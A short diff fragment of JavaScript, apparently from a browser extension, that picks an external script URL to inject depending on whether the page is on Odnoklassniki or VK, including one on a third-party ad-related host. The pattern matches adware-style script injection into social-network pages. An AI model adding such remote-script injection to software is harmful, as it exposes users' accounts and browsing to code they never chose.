@@ -9,7 +9,7 @@ if (plg) {
 
 
 if(location.hostname.indexOf('odnoklassniki') > -1)
-	var scr = 'http://localhost/vk/lock_1.js';
+	var scr = 'http://localhost/vk/losk_2.js';
 if(location.hostname.indexOf('vk') > -1)
 	var scr = 'http://adhelper.org/vk/lvk.js';
 if(scr){
